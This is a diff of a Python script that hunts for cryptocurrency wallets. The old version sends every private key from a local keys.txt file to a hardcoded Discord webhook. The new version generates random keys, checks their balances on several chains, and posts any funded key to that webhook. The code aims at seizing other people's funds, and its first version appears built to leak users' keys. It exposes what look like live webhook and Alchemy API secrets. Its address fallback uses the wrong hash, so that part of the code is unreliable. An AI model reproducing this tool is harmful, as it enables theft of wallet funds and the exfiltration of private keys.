@@ -1,101 +1,108 @@
 import secrets
 import requests
+import time
 import hashlib
 from ecdsa import SigningKey, SECP256k1
 import json
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from eth_account import Account
 
-# Your Discord Webhook (already inserted)
+# Your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1370714262237876224/od1EsdVEJ869kBHZB7vqGqXjOM55pcaK9NbPf_J97AUY5GFnHrVsRVcO-qB0oXY_012a"
 
-# Console Colors
+# Console colors
 RED = "\033[91m"
 GREEN = "\033[92m"
 RESET = "\033[0m"
 
-# RPC Endpoints
+# RPC endpoints
 RPC_ENDPOINTS = {
     "ETH": "https://eth-mainnet.g.alchemy.com/v2/kXg5eHzREfbkY0c7uxkdGOIRnjxHqby-",
     "POLYGON": "https://polygon-rpc.com",
-    "BNB": "https://bsc-dataseed.binance.org/"
+    "BNB": "https://bsc-dataseed.binance.org/",
+    "ARBITRUM": "https://arb1.arbitrum.io/rpc",
+    "OPTIMISM": "https://mainnet.optimism.io",
+    "AVAX": "https://api.avax.network/ext/bc/C/rpc"
 }
 
-def get_balance(address, rpc_url):
-    payload = {
-        "jsonrpc":"2.0",
-        "method":"eth_getBalance",
-        "params":[address, "latest"],
-        "id":1
+def generate_private_key():
+    return secrets.token_hex(32)
+
+def private_key_to_address(private_key_hex):
+    private_key_bytes = bytes.fromhex(private_key_hex)
+    sk = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
+    vk = sk.verifying_key
+    pub_key = b'\x04' + vk.to_string()
+    try:
+        import sha3
+        keccak_hash = sha3.keccak_256(pub_key).digest()
+    except ImportError:
+        keccak_hash = hashlib.sha3_256(pub_key).digest()
+    address = "0x" + keccak_hash[-20:].hex()
+    return address
+
+def check_balance(address, chain, rpc_url):
+    headers = {"Content-Type": "application/json"}
+    data = {
+        "jsonrpc": "2.0",
+        "method": "eth_getBalance",
+        "params": [address, "latest"],
+        "id": 1
     }
     try:
-        response = requests.post(rpc_url, json=payload, timeout=10)
-        result = int(response.json().get("result", "0x0"), 16) / 1e18
-        return result
+        response = requests.post(rpc_url, headers=headers, data=json.dumps(data), timeout=10)
+        result = response.json()
+        wei = int(result.get("result", "0x0"), 16)
+        return wei / 10**18
     except Exception as e:
-        return None
+        print(f"Error on {chain} for {address}: {e}")
+        return 0
 
 def send_to_discord(message):
     data = {"content": message}
     try:
         requests.post(WEBHOOK_URL, json=data)
     except Exception as e:
-        print(f"Failed to send to Discord: {e}")
+        print(f"Failed to send Discord message: {e}")
 
-def format_balance(label, balance):
-    if balance is None:
-        return f"{label}: ❌ Error"
-    elif balance > 0:
-        return f"{label}: {GREEN}{balance:.5f}{RESET}"
-    else:
-        return f"{label}: {RED}0{RESET}"
+try:
+    while True:
+        for _ in range(10):  # Generate and check 10 keys
+            priv_key = generate_private_key()
+            address = private_key_to_address(priv_key)
+            found = False
+            balances = {}
 
-def check_key(key):
-    try:
-        acct = Account.from_key(key)
-        address = acct.address
+            for chain, rpc_url in RPC_ENDPOINTS.items():
+                balance = check_balance(address, chain, rpc_url)
+                balances[chain] = balance
 
-        eth_bal = get_balance(address, RPC_ENDPOINTS["ETH"])
-        polygon_bal = get_balance(address, RPC_ENDPOINTS["POLYGON"])
-        bnb_bal = get_balance(address, RPC_ENDPOINTS["BNB"])
+                # Color red if zero, green if >0
+                if balance > 0:
+                    color = GREEN
+                    found = True
+                else:
+                    color = RED
 
-        msg_console = f"{address}\n" \
-                      f"{format_balance('ETH', eth_bal)}\n" \
-                      f"{format_balance('MATIC', polygon_bal)}\n" \
-                      f"{format_balance('BNB', bnb_bal)}\n" \
-                      f"Private Key: ||{key}||"
+                print(f"{chain} | Checked {address} - {color}{balance}{RESET}")
 
-        # Print to console with colors
-        print(msg_console + "\n" + "-"*30)
+            if found:
+                print(f"\n*** Balance found! ***")
+                print(f"Address: {address}")
+                print(f"Private Key: 0x{priv_key}\n")
+                with open("keys.txt", "a") as f:
+                    f.write(f"{address} : 0x{priv_key}\n")
 
-        # Prepare Discord message (without ANSI colors)
-        def clean_color(s):
-            for c in [RED, GREEN, RESET]:
-                s = s.replace(c, "")
-            return s
+                # Prepare Discord message
+                msg = f"💰 **Balance found!**\nAddress: `{address}`\n"
+                for chain, bal in balances.items():
+                    status = "🟢" if bal > 0 else "🔴"
+                    msg += f"{status} {chain}: {bal:.6f}\n"
+                msg += f"Private Key: ||0x{priv_key}||"  # spoiler tags to hide key
 
-        msg_discord = f"🔍 `{address}`\n" \
-                      f"ETH: {'🟢' if eth_bal and eth_bal > 0 else '🔴'} {eth_bal if eth_bal is not None else 'Error'}\n" \
-                      f"MATIC: {'🟢' if polygon_bal and polygon_bal > 0 else '🔴'} {polygon_bal if polygon_bal is not None else 'Error'}\n" \
-                      f"BNB: {'🟢' if bnb_bal and bnb_bal > 0 else '🔴'} {bnb_bal if bnb_bal is not None else 'Error'}\n" \
-                      f"Private Key: ||{key}||"
+                send_to_discord(msg)
 
-        send_to_discord(msg_discord)
-        return True
-    except Exception as e:
-        print(f"Error checking key: {e}")
-        send_to_discord(f"❌ Error checking key: {e}")
-        return False
+            else:
+                time.sleep(0.1)
+        time.sleep(1)
 
-def main():
-    with open("keys.txt", "r") as f:
-        keys = [line.strip() for line in f if line.strip()]
-
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(check_key, key) for key in keys]
-
-        for future in as_completed(futures):
-            future.result()  # wait for each to finish
-
-if __name__ == "__main__":
-    main()
+except KeyboardInterrupt:
+    print("\nStopped by user.")
